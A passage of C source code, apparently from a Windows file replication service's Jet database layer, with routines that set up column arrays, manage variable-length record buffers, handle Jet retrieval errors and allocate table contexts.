        // Fixed Size field.
        //
        DataSize = FieldInfo->Size;
    }

    if (DataSize > JColDesc->cbMax) {
        DPRINT4(0, "++ ERROR - DbsFieldDataSize() Failed on %s. Field (%s) too long: %d.  Set to %d.\n",
                TableName, JColDesc->szColumnName, DataSize, JColDesc->cbMax);
        DPRINT(0, "++ Internal error or field max width in schema must increase.\n");
        DataSize = JColDesc->cbMax;
    }

    return DataSize;
}

VOID
DbsSetJetColAddr (
    IN PTABLE_CTX TableCtx
    )
/*++

Routine Description:

    Initialize a Jet Set/Ret Column structure with the record field definitions
    in FieldInfo for the record starting at RecordBase.  The SETCOLUMN struct
    is used in Jet update and retrieval requests to tell Jet where the record
    data is or where to store the data retrieved.

    You must reinitialize the addresses any time you change record buffers to
    point at the new buffer.

Arguments:

    TableCtx  -- The table context struct which contains:

                FieldInfo  - Array of structs describing the size and offset
                             of each field.

                RecordBase - The base address of the record buffer to
                             read/write from/to jet.

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

                JSetColumn - The JET_SETCOLUMN struct array to be initialized.
                             NULL if not provided.

                JRetColumn - The JET_RETRIEVECOLUMN struct array to initialize.
                             NULL if not provided.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsSetJetColAddr:"

    ULONG i;
    ULONG NumberFields;

    PRECORD_FIELDS FieldInfo;
    PVOID RecordBase;
    PJET_TABLECREATE JTableCreate;
    PJET_SETCOLUMN JSetColumn;
    PJET_RETRIEVECOLUMN JRetColumn;
    PJET_COLUMNCREATE JColDesc;

    //
    // Point to the table create struct for column info and the
    // pointer to the record fields struct.
    //
    JTableCreate = TableCtx->pJetTableCreate;
    FieldInfo = TableCtx->pRecordFields + 1;  // skip elt 0.

    //
    // Get ptr to base of the data record.
    //
    RecordBase = TableCtx->pDataRecord;

    //
    // Get ptrs to the Jet Set/Ret column arrays.
    //
    JSetColumn = TableCtx->pJetSetCol;
    JRetColumn = TableCtx->pJetRetCol;

    //
    // Get the column descriptor information.
    //
    JColDesc =  JTableCreate->rgcolumncreate;

    //
    // The first FieldInfo record contains the length.
    //
    NumberFields = (ULONG) TableCtx->pRecordFields[0].Size;
    if (NumberFields != JTableCreate->cColumns) {
        DPRINT3(0, "++ ERROR - Missmatch between FieldInfo.Size (%d) and cColumns (%d) for table %s.  Check Schema.\n",
                NumberFields, JTableCreate->cColumns, JTableCreate->szTableName);
    }

    if (JSetColumn != NULL) {
        for (i=0; i<NumberFields; i++) {
            //
            // If the field size in the record is less than the max for the
            // column then then leave pvData alone.  The caller will allocate
            // a buffer and put a pointer to it in the record.
            // If field is marked as a fixed size buffer then use fixed buffer.
            //
            if ((FieldInfo[i].Size >= JColDesc[i].cbMax) ||
                IsFixedSzBufferField(FieldInfo[i].DataType)) {
                JSetColumn[i].pvData = (PCHAR) RecordBase + FieldInfo[i].Offset;
            }
        }
    }


    if (JRetColumn != NULL) {
        for (i=0; i<NumberFields; i++) {

            if ((FieldInfo[i].Size >= JColDesc[i].cbMax) ||
                IsFixedSzBufferField(FieldInfo[i].DataType)) {
                JRetColumn[i].pvData = (PCHAR) RecordBase + FieldInfo[i].Offset;
            }
        }
    }
}




VOID
DbsSetJetColSize(
    IN PTABLE_CTX TableCtx
    )
/*++

Routine Description:

    This routine initializes columnID and other misc fields in a Jet Set/Ret Col
    structures for a given table so we can use this to set and retrieve multiple
    columns in a single Jet call.


Arguments:

    TableCtx  -- The table context struct which contains:

                FieldInfo  - Array of structs describing the size and offset
                             of each field.

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

                JSetColumn - The JET_SETCOLUMN struct array to be initialized.
                             NULL if not provided.

                JRetColumn - The JET_RETRIEVECOLUMN struct array to initialize.
                             NULL if not provided.

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsSetJetColSize:"

    ULONG MaxCols;
    ULONG i;

    PRECORD_FIELDS FieldInfo;
    PJET_TABLECREATE JTableCreate;
    PJET_SETCOLUMN JSetColumn;
    PJET_RETRIEVECOLUMN JRetColumn;
    PJET_COLUMNCREATE JColDesc;

    //
    // Point to the table create struct for column info and the
    // pointer to the record fields struct.
    //
    JTableCreate = TableCtx->pJetTableCreate;
    FieldInfo = TableCtx->pRecordFields + 1;  // skip elt 0

    //
    // Get ptrs to the Jet Set/Ret column arrays.
    //
    JSetColumn = TableCtx->pJetSetCol;
    JRetColumn = TableCtx->pJetRetCol;

    //
    // Get the column descriptor information.
    //
    MaxCols = JTableCreate->cColumns;
    JColDesc =  JTableCreate->rgcolumncreate;


    //
    // Copy Jet's column ids from the column descriptior to the set column array
    // and set the data width of each column.
    //
    if (JSetColumn != NULL) {
        for (i=0; i<MaxCols; i++) {
            JSetColumn->columnid = JColDesc->columnid;
            //
            // If the field size in the record is less than the max for the
            // column then leave cbData alone.  The caller will allocate
            // a buffer and put a pointer to it in the record.
            // If field is marked as a fixed size buffer then use FieldInfo size.
            //
            if ((FieldInfo[i].Size >= JColDesc->cbMax) ||
                IsFixedSzBufferField(FieldInfo[i].DataType)) {
                JSetColumn->cbData = FieldInfo[i].Size;
            }
            JSetColumn->grbit = 0;
            JSetColumn->ibLongValue = 0;
            JSetColumn->itagSequence = 0;
            JSetColumn->err = JET_errSuccess;

            JSetColumn += 1;
            JColDesc += 1;
        }
    }


    //
    // Do the same for retreive column array if supplied.
    //

    JColDesc =  JTableCreate->rgcolumncreate;

    if (JRetColumn != NULL) {
        for (i=0; i<MaxCols; i++) {
            JRetColumn->columnid = JColDesc->columnid;

            if ((FieldInfo[i].Size >= JColDesc->cbMax) ||
                IsFixedSzBufferField(FieldInfo[i].DataType)) {
                JRetColumn->cbData = FieldInfo[i].Size;
            }
            JRetColumn->grbit = 0;
            JRetColumn->ibLongValue = 0;
            //
            // A zero for itagSequence tells jet to return the number of
            // occurances in a column. For tagged columns (not used here)
            // the value tells jet which of the multi-values to retrieve.
            // To get the data back for fixed and variable columns set this
            // to any non-zero value.
            //
            JRetColumn->itagSequence = 1;
            JRetColumn->columnidNextTagged = 0;
            JRetColumn->err = JET_errSuccess;

            JRetColumn += 1;
            JColDesc += 1;
        }
    }
}





NTSTATUS
DbsAllocRecordStorage(
    IN OUT PTABLE_CTX TableCtx
    )
/*++

Routine Description:

    This routine allocates the storage buffers for the variable length columns
    in which the record field size is supplied as 4 bytes (to hold a ptr).
    The buffer pointers are stored in the record using the FieldInfo offset and
    in the JSetColumn/JRetColumn structs if supplied.

    If the record field is non-null a new buffer is not allocated.  A consistency
    check is made with the pvData fields in the Set/Ret column structs with
    the ptr in the record field.  If they don't match the ptr in the record
    field is used and the old buffer is freed.

    If the record field is null and there is a non-null buffer pointer
    in either the Jet Set/Ret Column structs then that buffer is used.

    Otherwise a new buffer is allocated using the default size in
    JColDesc[i].cbMax.

Arguments:

    TableCtx  -- The table context struct which contains:

                FieldInfo  - Array of structs describing the size and offset
                             of each field.

                RecordBase - The base address of the record buffer to
                             read/write from/to jet.

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

                JSetColumn - The JET_SETCOLUMN struct array to be initialized.
                             NULL if not provided.

                JRetColumn - The JET_RETRIEVECOLUMN struct array to initialize.
                             NULL if not provided.
Return Value:

    STATUS_INSUFFICIENT_RESOURCES if malloc fails.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsAllocRecordStorage:"

    ULONG MaxCols;
    ULONG i;
    ULONG InitialSize;
    PVOID Buf;
    PVOID *RecordField;
    PVOID pRData;
    PVOID pSData;

    PRECORD_FIELDS      FieldInfo;
    PVOID               RecordBase;
    PJET_TABLECREATE    JTableCreate;
    PJET_SETCOLUMN      JSetColumn;
    PJET_RETRIEVECOLUMN JRetColumn;
    PJET_COLUMNCREATE   JColDesc;
    JET_ERR             jerr;

    //
    // Point to the table create struct for column info and the
    // pointer to the record fields struct.
    //
    JTableCreate = TableCtx->pJetTableCreate;
    FieldInfo = TableCtx->pRecordFields + 1;   // jump over elt 0

    //DPRINT2(5, "++ Get record storage for Table %s, pTableCtx %08x\n",
    //        JTableCreate->szTableName, TableCtx);

    //
    // Get ptr to base of the data record.
    //
    RecordBase = TableCtx->pDataRecord;

    //
    // Get ptrs to the Jet Set/Ret column arrays.
    //
    JSetColumn = TableCtx->pJetSetCol;
    JRetColumn = TableCtx->pJetRetCol;

    //
    // Get the column descriptor information.
    //
    MaxCols = JTableCreate->cColumns;
    JColDesc =  JTableCreate->rgcolumncreate;

    for (i=0; i<MaxCols; i++) {

        //
        // If the record structure field size is less than the max column width
        // and is big enough to hold a pointer then allocate the storage for
        // for the field and set the record pointer to point at it.
        // Cap the initial allocation at INITIAL_BINARY_FIELD_ALLOCATION.
        // The field max is set for the Jet Column which is usually much
        // larger.
        //

        if (FIELD_IS_PTR(FieldInfo[i].Size, JColDesc[i].cbMax)) {

            //
            // If the field is marked as spare then don't allocate any buffer
            // space for it.  Spare fields are allocated in Jet's database
            // record structure to avoid the necessity of frequent DB upgrades.
            // To use a spare field in the future clear the spare bit in the
            // record field struct.
            //
            if (IsSpareField(FieldInfo[i].DataType)) {
                continue;
            }

            //
            // If the record field is unaligned then complain and skip it.
            //
            RecordField = (PVOID *) ((PCHAR) RecordBase + FieldInfo[i].Offset);

            if (!ValueIsMultOf4(RecordField)) {
                DPRINT3(0, "++ ERROR - Unaligned ptr to record field %s. base/offset = %08x/%08x\n",
                        JColDesc[i].szColumnName, RecordBase, FieldInfo[i].Offset);
                continue;
            }


            pSData = (PVOID) ((JSetColumn != NULL) ? JSetColumn[i].pvData : NULL);
            pRData =          (JRetColumn != NULL) ? JRetColumn[i].pvData : NULL;

            //
            // If the record field is non-null then it has a buffer assigned.
            // Don't allocate another.  Check consistency with Set/Ret
            // pvData pointers though and do fixup.
            //
            if (*RecordField != NULL) {
                if (pSData != *RecordField) {
                    if (pSData != NULL) {
                        DPRINT3(3, "++ Warning - New binary field buffer (%08x) provided for %s. Old write buffer (%08x) replaced\n",
                                *RecordField, JColDesc[i].szColumnName, pSData);
                        FrsFree(pSData);
                    } else {
                        DPRINT2(3, "++ New binary field buffer (%08x) provided for %s.\n",
                                *RecordField, JColDesc[i].szColumnName);
                    }
                    JSetColumn[i].pvData = *RecordField;
                }

                if (pRData != *RecordField) {
                    if ((pRData != NULL) && (pRData != pSData)) {
                        DPRINT3(3, "++ Warning - New binary field buffer (%08x) provided for %s. Old read buffer (%08x) replaced\n",
                                *RecordField, JColDesc[i].szColumnName, pRData);
                        FrsFree(pRData);
                    } else {
                        DPRINT2(3, "++ New binary field buffer (%08x) provided for %s.\n",
                                *RecordField, JColDesc[i].szColumnName);
                    }
                    JRetColumn[i].pvData = *RecordField;
                }
                continue;
            }

            //
            // RecordField is NULL.  If there is already a buffer allocated
            // then assign it to the record field and don't allocate another.
            //
            if ((pSData != NULL) && (pRData != NULL)) {
                *RecordField = pRData;
                continue;
            }

            //
            // Allocate a new buffer.  cbMax is a column size limit imposed
            // by Jet.  For some columns we want some very large upper bounds
            // but cap the initial allocation at 256 bytes.
            //
            InitialSize = JColDesc[i].cbMax;
            if (InitialSize > INITIAL_BINARY_FIELD_ALLOCATION) {
                InitialSize = INITIAL_BINARY_FIELD_ALLOCATION;
            }
            //
            // Alloc an initial buffer unless NoDefaultAlloc flag is set.
            //
            if (!IsNoDefaultAllocField(FieldInfo[i].DataType)) {
                jerr = DbsReallocateFieldBuffer(TableCtx, i, InitialSize, FALSE);
                if (!JET_SUCCESS(jerr)) {
                    goto ERROR_RET;
                }
            }
        }
    }

    return STATUS_SUCCESS;


ERROR_RET:

    //
    // Free any runtime allocated record buffers.
    //
    DbsFreeRecordStorage(TableCtx);

    return STATUS_INSUFFICIENT_RESOURCES;
}



VOID
DbsFreeRecordStorage(
    IN PTABLE_CTX TableCtx
    )
/*++

Routine Description:

    This routine frees the storage buffers for the variable length columns.
    These are identified by a field size of 4 bytes (to hold a PVOID) and
    a maximum column size that is larger.
    If the pointer is null in the JSetColumn and/or the JRetColumn structs
    then the buffer has been taken and the taker will free it.  The pointer
    in the data record field is also set to null if the buffer is freed.
    This latter is done by DbsReallocateFieldBuffer.

Arguments:

    TableCtx  -- The table context struct which contains:

                FieldInfo  - Array of structs describing the size and offset
                             of each field.

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsFreeRecordStorage:"

    ULONG MaxCols;
    ULONG i;

    PRECORD_FIELDS FieldInfo;
    PJET_TABLECREATE JTableCreate;
    PJET_COLUMNCREATE JColDesc;

    //
    // Point to the table create struct for column info and the
    // pointer to the record fields struct.
    //
    JTableCreate = TableCtx->pJetTableCreate;
    FieldInfo = TableCtx->pRecordFields + 1;  // skip elt 0

    if ((JTableCreate == NULL) || (TableCtx->pRecordFields == NULL)) {
        DPRINT2(4, "++ DbsFreeRecordStorage: Null ptr - JTableCreate: %08x, FieldInfo: %08x\n",
                JTableCreate, TableCtx->pRecordFields);
        return;
    }

    //DPRINT2(5, "++ Free record storage for Table %s, pTableCtx %08x\n",
    //        JTableCreate->szTableName, TableCtx);

    //
    // Get the column descriptor information.
    //
    MaxCols = JTableCreate->cColumns;
    JColDesc =  JTableCreate->rgcolumncreate;

    for (i=0; i<MaxCols; i++) {

        //
        // If the record structure field size is less than the max column width
        // and is big enough to hold a pointer then DbsAllocRecordStorage
        // allocated storage for it.
        //
        if (FIELD_IS_PTR(FieldInfo[i].Size, JColDesc[i].cbMax)) {
            //
            // Free the buffer and set the length to zero.
            //
            DbsReallocateFieldBuffer(TableCtx, i, 0, FALSE);
        }
    }
}



JET_ERR
DbsCheckSetRetrieveErrors(
    IN OUT PTABLE_CTX TableCtx
    )
/*++

Routine Description:

    This routine checks the Jet Error returns in the JSetColumn/JRetColumn
    structs.  For variable length fields on retrievals it also checks
    if the buffer size is too small.  If so it allocates a larger buffer and
    refetches the data from jet.

Arguments:

    TableCtx  -- The table context struct which contains:

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

                JSetColumn - The JET_SETCOLUMN struct array to be initialized.
                             NULL if not provided.

                JRetColumn - The JET_RETRIEVECOLUMN struct array to initialize.
                             NULL if not provided.

Return Value:

    Jet Error Status

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCheckSetRetrieveErrors:"

    JET_ERR jerr;
    JET_ERR RetError = JET_errSuccess;
    ULONG MaxCols;
    ULONG i;
    ULONG Actual;

    JET_SESID           Sesid;
    JET_TABLEID         Tid;
    PJET_TABLECREATE    JTableCreate;
    PRECORD_FIELDS      FieldInfo;
    PJET_SETCOLUMN      JSetColumn;
    PJET_RETRIEVECOLUMN JRetColumn;
    PJET_COLUMNCREATE   JColDesc;

    Sesid        = TableCtx->Sesid;
    Tid          = TableCtx->Tid;

    //
    // Point to the table create struct for column info and the
    // pointer to the record fields struct.
    //
    JTableCreate = TableCtx->pJetTableCreate;
    FieldInfo = TableCtx->pRecordFields + 1;   // jump over elt 0

    //
    // Get ptrs to the Jet Set/Ret column arrays.
    //
    JSetColumn = TableCtx->pJetSetCol;
    JRetColumn = TableCtx->pJetRetCol;

    //
    // Get the column descriptor information.
    //
    MaxCols = JTableCreate->cColumns;
    JColDesc =  JTableCreate->rgcolumncreate;

    for (i=0; i<MaxCols; i++) {

        //
        // Skip spare fields.
        //
        if (IsSpareField(FieldInfo[i].DataType)) {
            continue;
        }

        jerr = JET_errSuccess;
        //
        // Look at the error return for the jet set operation.
        //
        if ((JSetColumn != NULL) &&
            (JSetColumn[i].err != JET_wrnColumnNull)) {
            //
            // Check error return on set column
            //
            jerr = JSetColumn[i].err;
            DPRINT1_JS(0, "++ Jet set error for column %s.",
                       JColDesc[i].szColumnName, jerr);
        }

        //
        // Look at the error return for the jet retrieval operation.
        //
        if ((JRetColumn != NULL) && (!JET_SUCCESS(JRetColumn[i].err))) {
            jerr = JRetColumn[i].err;
            //
            // Error return on retrieve column
            //
            // If there wasn't enough room in the buffer for the returned
            // data try to increase the size of the buffer and refetch the
            // data otherwise it's an error.
            //
            if (jerr == JET_wrnBufferTruncated) {
                Actual = JRetColumn[i].cbActual;

                jerr = DbsReallocateFieldBuffer(TableCtx, i, Actual, FALSE);

                if (JET_SUCCESS(jerr)) {
                    //
                    // Now try to go get the data again.
                    //
                    jerr = JetRetrieveColumns(Sesid, Tid, &JRetColumn[i], 1);
                    DPRINT1_JS(0, "++ Jet retrieve error for reallocated column %s.",
                               JColDesc[i].szColumnName, jerr);
                } else
                if (jerr == JET_errInvalidParameter) {
                    //
                    // Buffer wasn't allocated at run time but was too small.
                    // This is a schema def error.
                    //
                    DPRINT1_JS(0, "++ Schema error - Fixed record field too small for %s.",
                               JColDesc[i].szColumnName, jerr);
                }
            } else
            //
            // Null column is not an error but if it is for a fixed sized
            // buffer with a variable length field then zero the buffer.
            //
            if (jerr == JET_wrnColumnNull) {
                if ((IsFixedSzBufferField(FieldInfo[i].DataType)) &&
                    (JColDesc[i].coltyp == JET_coltypLongBinary)) {
                    ZeroMemory(JRetColumn[i].pvData, FieldInfo[i].Size);
                }

                jerr = JET_errSuccess;
            //
            // Some other type of retrieve error.  Complain.
            //
            } else {
                DPRINT1_JS(0, "++ Jet retrieve error for column %s.",
                           JColDesc[i].szColumnName, jerr);
            }
        }
        //
        // Save the first error we were not able to correct.
        //
        RetError = JET_SUCCESS(RetError) ? jerr : RetError;
    }
    //
    // Return the first error we were not able to correct.
    //
    return RetError;

}




JET_ERR
DbsReallocateFieldBuffer(
    IN OUT PTABLE_CTX TableCtx,
    IN ULONG FieldIndex,
    IN ULONG NewSize,
    IN BOOL KeepData
    )
/*++

Routine Description:

    This routine releases the buffer associated with the specified field
    and allocates a new buffer with the desired size.  We update the pointer
    in the data record and the JetSet/RetColumn structs.

Arguments:

    TableCtx  -- The table context struct which contains:

                FieldInfo  - Array of structs describing the size and offset
                             of each field.

                RecordBase - The base address of the record buffer to
                             read/write from/to jet.

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

                JSetColumn - The JET_SETCOLUMN struct array to be initialized.
                             NULL if not provided.

                JRetColumn - The JET_RETRIEVECOLUMN struct array to initialize.
                             NULL if not provided.

    FieldIndex -- The index of the field to change (from the xx_COL_LIST enum).

    NewSize -- The size of the new buffer to allocate.  If NewSize is zero the
               buffer(s) for the field are released and the pointers are
               set to NULL.

    KeepData -- If the NewSize > 0 and KeepData is true then resize the buffer
                but copy the data to the new buffer.  The amount copied is
                min(NewSize, CurrentSize).


Return Value:

    Jet Error Status

--*/
{
#undef DEBSUB
#define DEBSUB "DbsReallocateFieldBuffer:"

    JET_ERR jerr;
    ULONG MaxCols;
    ULONG i;
    ULONG Actual;
    ULONG MoveLength;
    PVOID Buf;
    PVOID *RecordField;
    PVOID ppRF;
    PVOID pRData;
    PVOID pSData;

    PRECORD_FIELDS      FieldInfo;
    PVOID               RecordBase;
    PJET_TABLECREATE    JTableCreate;
    PJET_SETCOLUMN      JSetColumn;
    PJET_RETRIEVECOLUMN JRetColumn;
    PJET_COLUMNCREATE   JColDesc;

    //
    // Point to the table create struct for column info and the
    // pointer to the record fields struct.
    //
    JTableCreate = TableCtx->pJetTableCreate;
    FieldInfo    = TableCtx->pRecordFields + 1;  // skip elt 0

    //
    // Get ptr to base of the data record.
    //
    RecordBase = TableCtx->pDataRecord;

    //
    // Get ptrs to the Jet Set/Ret column arrays.
    //
    JSetColumn = TableCtx->pJetSetCol;
    JRetColumn = TableCtx->pJetRetCol;

    //
    // Get the column descriptor information.
    //
    MaxCols = JTableCreate->cColumns;
    JColDesc =  JTableCreate->rgcolumncreate;

    if (FieldIndex > MaxCols) {
        DPRINT3(0, "++ ERROR - Invalid column index (%d) for Table %s, pTableCtx %08x\n",
                FieldIndex, JTableCreate->szTableName, TableCtx);

        return JET_errInvalidParameter;
    }

    i = FieldIndex;
    Actual = NewSize;

    //
    // Now check if this field even has a runtime allocated buffer.
    //
    if (!FIELD_IS_PTR(FieldInfo[i].Size, JColDesc[i].cbMax)) {
        //
        // Check for a fixed size buffer with a variable sized database column
        // and allow column size to grow up to buffer width.
        //
        if ((IsFixedSzBufferField(FieldInfo[i].DataType)) &&
            (JColDesc[i].coltyp == JET_coltypLongBinary) &&
            (Actual <= FieldInfo[i].Size)) {

            JSetColumn[i].cbData = Actual;
            JRetColumn[i].cbData = Actual;

            return JET_errSuccess;
        } else {
            //
            // Buffer isn't allocated at run time so we can't enlarge it past
            // the field info size.  Return Invalid parameter.
            //
            DPRINT5(0, "++ ERROR - Cannot reallocate fixed record field. Col: %s, base/offset/bufsz/datasz = %08x / %08x / %d / %d\n",
                JColDesc[i].szColumnName, RecordBase, FieldInfo[i].Offset,
                JRetColumn[i].cbData, Actual);

            JSetColumn[i].cbData = FieldInfo[i].Size;
            JRetColumn[i].cbData = FieldInfo[i].Size;

            return JET_errInvalidParameter;
        }
    }


    //
    // Buffer was allocated at run time.  Delete or adjust the buffer size.
    //
    if (Actual > 0) {
        //
        // Reallocate the runtime buffer.
        //
        try {
            Buf = FrsAlloc(Actual);
            //DPRINT5(5, "++ Reallocating record field buffer for %-22s. base/offset/bufsz/datasz = %08x / %08x / %d / %d\n",
            //    JColDesc[i].szColumnName, RecordBase, FieldInfo[i].Offset,
            //    JRetColumn[i].cbData, Actual);
        }
        except(EXCEPTION_EXECUTE_HANDLER) {
            DPRINT1_WS(0, "++ DbsReallocateFieldBuffer realloc failed on size %d :",
                       Actual, GetLastError());
            return JET_errOutOfMemory;
        }
    } else {
        //
        // The request is to delete the buffer.
        //
        Buf = (PVOID) NULL;
        //DPRINT5(5, "++ Releasing record field buffer: %-22s. base/offset/bufsz/datasz = %08x / %08x / %d / %d\n",
        //    JColDesc[i].szColumnName, RecordBase, FieldInfo[i].Offset,
        //    JRetColumn[i].cbData, Actual);
    }


    //
    // We have new buffer.  Free the old one and set ptr to
    // new one in the record field and in the JetRetColumn
    // and SetCol structs.  Set actual size into cbData.
    //
    pSData = (PVOID) ((JSetColumn != NULL) ? JSetColumn[i].pvData : NULL);
    pRData =          (JRetColumn != NULL) ? JRetColumn[i].pvData : NULL;

    RecordField = (PVOID *) ((PCHAR) RecordBase + FieldInfo[i].Offset);

    if (!ValueIsMultOf4(RecordField)) {
        DPRINT3(0, "++ ERROR - Unaligned ptr to record field %s. base/offset = %08x/%08x\n",
                JColDesc[i].szColumnName, RecordBase, FieldInfo[i].Offset);

        Buf = FrsFree(Buf);
        return JET_errInvalidParameter;
    }

    //
    // If we are keeping the data then compare the new length with
    // the length from JSetCol or JRetCol as long as the Record Field
    // pointer matches the respective buffer address.  The size of
    // the buffer in the JSetCol struct has priority.  It is typically
    // the case that the record field pointer and the JSet/RetColumn
    // pointers all point to the same buffer.
    //
    if (KeepData && (RecordBase != NULL)) {
        ppRF = *RecordField;

        if ((ppRF != NULL) && (pSData == ppRF)) {
            MoveLength = min(Actual, JSetColumn[i].cbData);
        } else
        if ((ppRF != NULL) && (pRData == ppRF)) {
            MoveLength = min(Actual, JRetColumn[i].cbData);
        } else {
            MoveLength = 0;
        }
        if (MoveLength > 0) {
            CopyMemory(Buf, ppRF, MoveLength);
        }
    }

    FrsFree(pSData);
    JSetColumn[i].pvData = Buf;
    JSetColumn[i].cbData = Actual;

    if ((pRData != NULL) && (pRData != pSData)) {
        FrsFree(pRData);
    }
    JRetColumn[i].pvData = Buf;
    JRetColumn[i].cbData = Actual;

    //
    // Point the record field at the new buffer.
    //
    if (RecordBase != NULL) {
        *RecordField = Buf;
    }


    return JET_errSuccess;

}





NTSTATUS
DbsAllocTableCtx(
    IN TABLE_TYPE TableType,
    IN OUT PTABLE_CTX TableCtx
    )
/*++

Routine Description:

    This routine allocates memory for a TABLE_CTX struct.  This includes the
    base table record (not including variable len fields) and the
    Jet Set/Ret Column structs.  The allocated memory is zeroed.

Arguments:

    TableType  -- The table context ID number indexes FrsTableProperties.

    TableCtx  -- The table context struct to init.

Return Value:

    STATUS_INSUFFICIENT_RESOURCES if memory alloc fails and any that succeeded
                                  are freed.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsAllocTableCtx:"

    return( DbsAllocTableCtxWithRecord(TableType, TableCtx, NULL));
}


NTSTATUS
DbsAllocTableCtxWithRecord(
    IN TABLE_TYPE TableType,
    IN OUT PTABLE_CTX TableCtx,
    IN PVOID DataRecord
    )
/*++

Routine Description:

    This routine allocates memory for a TABLE_CTX struct.  This includes the
    base table record (not including variable len fields) if DataRecord is
    NULL and the Jet Set/Ret Column structs.  The allocated memory is zeroed.
    If the TableCtx is already initialized and of the same table type then
    we just return after updating the DataRecord pointer if provided.
    If the caller has freed the data record but left the table ctx initialized
    then we allocate a new one here.

    Warning:  THis routine only inits a TableCtx.  The caller must still call:

        DbsSetJetColSize(TableCtx);
        DbsSetJetColAddr(TableCtx);

    to setup the data field addresses for JET and call

        DbsAllocRecordStorage(TableCtx);

    to allocate storage for the variable length fields in the record and
    update the JetSet/RetCol arrays appropriately.

    When done with the TableCtx, close the table and call

        DbsFreeTableCtx(TableCtx, 1);

    to release the all the storage that was allocated.  Note this does not
    free the TableCtx struct itself.  If the TableCtx struct was dynamically
    allocated then a call to DbsFreeTableContext() will close the table and
    then call DbsFreeTableCtx() and FrsFree() on the TableCtx struct.

Arguments:

    TableType  -- The table context ID number indexes FrsTableProperties.

    TableCtx  -- The table context struct to init.

    DataRecord -- The pointer to the inital base data record or NULL if
                  the base data record is allocated here.
                  Warning -- it is up to the caller to ensure that the size
                  of the preallocated data record is correct for the table
                  in question.  No check is make here.

Return Value:

    STATUS_INSUFFICIENT_RESOURCES if memory alloc fails and any that succeeded
                                  are freed.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsAllocTableCtxWithRecord:"


    ULONG NumberColumns;
    ULONG SetColSize;
    ULONG RetColSize;
    ULONG RecordSize;
    PRECORD_FIELDS pRecordFields;


    //DPRINT3(5, "++ Get TableCtx memory for table %s, TableType %d, pTableCtx %08x\n",
    //        DBTables[TableType].szTableName, TableType, TableCtx);

    //if (!ForceInit && (TableCtx->pRecordFields != NULL)) {
    //    return STATUS_SUCCESS;
    //}

    //
    // If table type matches then check the data record and then we are done.
    //
    if (TableCtx->TableType == (ULONG)TableType) {
        //
        // If the data record is gone then allocate a new one.
        // Buffers for variable length fields are added later by  a call
        // to DbsAllocRecordStorage.  Get the base record size from the offset
        // field of element zero of the Record Fields struct for this table.
        // This is a CSHORT so max size is 64KB on base record.
        //
        if (DataRecord == NULL) {
            if (TableCtx->pDataRecord == NULL) {
                RecordSize = (ULONG) TableCtx->pRecordFields->Offset;
                TableCtx->pDataRecord = FrsAlloc(RecordSize);
            }
        } else {
            if ((TableCtx->pDataRecord != NULL) &&
                (TableCtx->pDataRecord != DataRecord)) {
                DPRINT(0, "++ ERROR - Overwriting non-null data record pointer in table ctx.  memory leak??\n");
                DPRINT3(0, "++ For table %s, TableType %d, pTableCtx %08x\n",
                        DBTables[TableType].szTableName, TableType, TableCtx);
            }
            TableCtx->pDataRecord = DataRecord;
        }
        //
        // Table ctx already inited for this table type.
        //
        return STATUS_SUCCESS;
    }


    if (TableType >= TABLE_TYPE_INVALID) {
        DPRINT2(0, "++ ERROR - Invalid Table Type Code: %d, pTableCtx %08x\n",
                TableType, TableCtx);
        FRS_ASSERT(!"Invalid Table Type Code");
        return STATUS_INVALID_PARAMETER;
    }

    try {

        //
        // Get the pointer to the record field definition struct.
        //
        pRecordFields = FrsTableProperties[TableType].RecordFields;
        TableCtx->pRecordFields = pRecordFields;
        //
        // Add the table property fields.
        //
        TableCtx->PropertyFlags = FrsTableProperties[TableType].PropertyFlags;
        //
        // Mark table as not open by a session yet.
        //
        TableCtx->Tid   = JET_tableidNil;
        TableCtx->Sesid = JET_sesidNil;
        TableCtx->ReplicaNumber = FRS_UNDEFINED_REPLICA_NUMBER;
        TableCtx->TableType = TableType;

        //
        // Point to the table create struct for table name and size info and the
        // pointer to the record fields struct.
        //
        TableCtx->pJetTableCreate = &DBTables[TableType];

        //
        // Allocate the initial data record.
        // Buffers for variable length fields are added later by  a call
        // to DbsAllocRecordStorage.  Get the base record size from the offset
        // field of element zero of the Record Fields struct for this table.
        // This is a CSHORT so max size is 64KB on base record.
        //
        if (DataRecord == NULL) {
            RecordSize = (ULONG) pRecordFields->Offset;
            TableCtx->pDataRecord = FrsAlloc(RecordSize);
            SetFlag(TableCtx->PropertyFlags, FRS_TPF_NOT_CALLER_DATAREC);
        } else {
            TableCtx->pDataRecord = DataRecord;
        }

        //
        // Get the number of columns in the table.
        //
        NumberColumns = DBTables[TableType].cColumns;

        //
        // Allocate the Jet Set/Ret column arrays.
        //
        SetColSize = NumberColumns * sizeof(JET_SETCOLUMN);
        TableCtx->pJetSetCol = FrsAlloc(SetColSize);

        RetColSize = NumberColumns * sizeof(JET_RETRIEVECOLUMN);
        TableCtx->pJetRetCol = FrsAlloc(RetColSize);


    }

    except(EXCEPTION_EXECUTE_HANDLER) {

        if (DataRecord == NULL) {
            TableCtx->pDataRecord = FrsFree(TableCtx->pDataRecord);
        }
        TableCtx->pJetSetCol  = FrsFree(TableCtx->pJetSetCol);
        TableCtx->pJetRetCol  = FrsFree(TableCtx->pJetRetCol);

        DPRINT2(0, "++ ERROR - Failed to get TableCtx memory for ID %d, pTableCtx %08x\n",
                 TableType, TableCtx);

        return STATUS_INSUFFICIENT_RESOURCES;
    }


    return STATUS_SUCCESS;

}




VOID
DbsFreeTableCtx(
    IN OUT PTABLE_CTX TableCtx,
    IN ULONG NodeType
    )
/*++

Routine Description:

    This routine frees the memory for a TABLE_CTX struct.  This includes the
    base table record and any variable len fields.
    It marks the freed memory with the hex string 0xDEADBEnn where
    the low byte (nn) is set to the node type being freed to catch users of
    stale pointers.

Arguments:

    TableCtx  -- The table context struct to free.

